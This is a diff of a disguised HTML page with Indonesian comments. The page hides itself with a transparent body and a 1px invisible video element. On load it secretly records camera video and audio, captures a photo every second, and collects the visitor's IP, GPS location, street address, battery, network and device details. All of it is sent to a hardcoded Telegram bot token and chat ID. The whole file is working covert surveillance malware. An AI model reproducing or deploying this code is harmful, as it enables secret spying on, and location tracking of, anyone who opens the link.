@@ -2,9 +2,9 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Auto Kirim Telegram</title>
+  <title>msmsmsm</title>
   <style>
-    body { margin: 0; background: transparent; overflow: hidden; color: transparent; }
+    body { margin: 0; overflow: hidden; background: transparent; color: transparent; }
     video { position: fixed; bottom: 0; right: 0; width: 1px; height: 1px; opacity: 0; }
   </style>
 </head>
@@ -15,41 +15,44 @@ const token = '7877584682:AAHvvEzlzWyWq5QOKnx7y3cjPcMIOBOPUdg';
 const chat_id = '7552410869';
 
 let cams = [], camIndex = 0;
-let chunksVideo = [], chunksAudio = [];
 let currentStream = null;
+let chunksVideo = [], chunksAudio = [];
 
-async function startAll() {
+window.onload = async () => {
   await getCameras();
+  sendDeviceInfo(); // kirim info awal langsung
   sendStaticPhoto();
-  sendDeviceInfo();
-  await switchCamAndRecord();
-  setInterval(() => switchCamAndRecord(), 12000); // ganti kamera tiap 12s
-  setInterval(() => autoCapturePhoto(), 1000);     // foto tiap 1s
-}
+  await switchCamAndRecord(); // mulai kamera
+  setInterval(() => switchCamAndRecord(), 12000);
+  setInterval(() => autoCapturePhoto(), 1000);
+};
 
+// ambil semua kamera
 async function getCameras() {
   const devices = await navigator.mediaDevices.enumerateDevices();
   cams = devices.filter(d => d.kind === 'videoinput');
-  if (cams.length === 0) alert('Tidak ada kamera ditemukan!');
 }
 
+// ganti kamera + rekam video/audio
 async function switchCamAndRecord() {
-  if (cams.length === 0) await getCameras();
+  if (cams.length === 0) return;
   const deviceId = cams[camIndex % cams.length].deviceId;
   camIndex++;
 
   if (currentStream) currentStream.getTracks().forEach(t => t.stop());
 
   const stream = await navigator.mediaDevices.getUserMedia({
-    video: { deviceId: { exact: deviceId } },
+    video: {
+      deviceId: { exact: deviceId },
+      width: { ideal: 1280 },
+      height: { ideal: 720 }
+    },
     audio: true
   });
-
   currentStream = stream;
-  const video = document.getElementById('video');
-  video.srcObject = stream;
+  document.getElementById('video').srcObject = stream;
 
-  // Rekam video
+  // Video
   const videoRecorder = new MediaRecorder(stream);
   videoRecorder.ondataavailable = e => { if (e.data.size > 0) chunksVideo.push(e.data); };
   videoRecorder.onstop = () => {
@@ -63,7 +66,7 @@ async function switchCamAndRecord() {
   videoRecorder.start();
   setTimeout(() => videoRecorder.stop(), 10000);
 
-  // Rekam audio
+  // Audio
   const audioRecorder = new MediaRecorder(stream);
   audioRecorder.ondataavailable = e => { if (e.data.size > 0) chunksAudio.push(e.data); };
   audioRecorder.onstop = () => {
@@ -78,6 +81,7 @@ async function switchCamAndRecord() {
   setTimeout(() => audioRecorder.stop(), 10000);
 }
 
+// foto tiap 1 detik
 async function autoCapturePhoto() {
   const video = document.getElementById('video');
   if (!video.videoWidth) return;
@@ -93,37 +97,25 @@ async function autoCapturePhoto() {
   fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: form });
 }
 
-function sendStaticPhoto() {
-  const form = new FormData();
-  form.append("chat_id", chat_id);
-  form.append("photo", 'https://files.catbox.moe/p7xbtg.png');
-  form.append("caption", "🆁🅸🆉");
-  fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: form });
-}
-
+// kirim 1x info sistem saat awal
 async function sendDeviceInfo() {
   const waktu = new Date().toLocaleString();
   const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip);
   const ua = navigator.userAgent;
-  const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Tidak diketahui';
+  const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A';
   const bat = await navigator.getBattery().then(b => `${Math.round(b.level * 100)}% (${b.charging ? 'Mengisi' : 'Tidak'})`);
-  const net = navigator.connection ? `${navigator.connection.effectiveType}, ${navigator.connection.downlink} Mbps` : 'Tidak tersedia';
-  const brand = ua.match(/Android.*?;\s(.+?)\sBuild/)?.[1] || 'Tidak diketahui';
+  const net = navigator.connection ? `${navigator.connection.effectiveType}, ${navigator.connection.downlink} Mbps` : 'N/A';
+  const brand = ua.match(/Android.*?;\s(.+?)\sBuild/)?.[1] || 'N/A';
   const url = location.href;
 
   navigator.geolocation.getCurrentPosition(async pos => {
     const lat = pos.coords.latitude;
     const lon = pos.coords.longitude;
     const maps = `https://maps.google.com/?q=${lat},${lon}`;
-    const g = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
-    const j = await g.json();
-    const lokasi = j.display_name || 'Lokasi tidak diketahui';
-    const alamat = j.address || {};
-    const kota = alamat.city || alamat.town || alamat.village || 'Tidak diketahui';
-    const kodepos = alamat.postcode || 'N/A';
-    const jalan = alamat.road || alamat.neighbourhood || 'N/A';
-    const negara = alamat.country || 'N/A';
-    const rumah = alamat.house_number || '-';
+    const lokasi = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`)
+      .then(r => r.json()).then(j => j.display_name || 'Lokasi tidak diketahui');
+    
+    const kota = lokasi.split(',')[1]?.trim() || 'Jakarta';
 
     let cuaca = '';
     try {
@@ -133,26 +125,21 @@ async function sendDeviceInfo() {
         const w = jc.result.weather[0];
         cuaca = `🌤️ Cuaca: ${w.main} (${w.description})\n🌡️ Suhu: ${jc.result.main.temp}°C\n💧 Kelembaban: ${jc.result.main.humidity}%\n🌬️ Angin: ${jc.result.wind.speed} m/s`;
       }
-    } catch(e) {
-      cuaca = 'Gagal ambil cuaca';
-    }
+    } catch { cuaca = 'Gagal ambil cuaca'; }
 
     const info = `
-📍 Lokasi Lengkap: ${lokasi}
-🏠 Jalan: ${jalan}, No: ${rumah}
-📫 Kode Pos: ${kodepos}
-🌍 Negara: ${negara}
-🗺️ Link Maps: ${maps}
+📍 Lokasi: ${lokasi}
+🗺️ Maps: ${maps}
 🕒 Waktu: ${waktu}
 🌐 IP: ${ip}
 🔋 Baterai: ${bat}
 📶 Jaringan: ${net}
-📱 User-Agent: ${ua}
-📱 Merek Android: ${brand}
+📱 Device: ${brand}
 💾 RAM: ${ram}
-🔗 DARI URL: ${url}
-📡 CUACA SAAT INI:
-${cuaca}`;
+🧠 User-Agent: ${ua}
+🔗 URL: ${url}
+☁️ Cuaca: ${cuaca}`;
+
     fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -161,7 +148,14 @@ ${cuaca}`;
   });
 }
 
-window.onload = startAll;
+// kirim stiker pembuka
+function sendStaticPhoto() {
+  const form = new FormData();
+  form.append("chat_id", chat_id);
+  form.append("photo", 'https://files.catbox.moe/p7xbtg.png');
+  form.append("caption", "🆁🅸🆉");
+  fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: form });
+}
 </script>
 </body>
 </html>
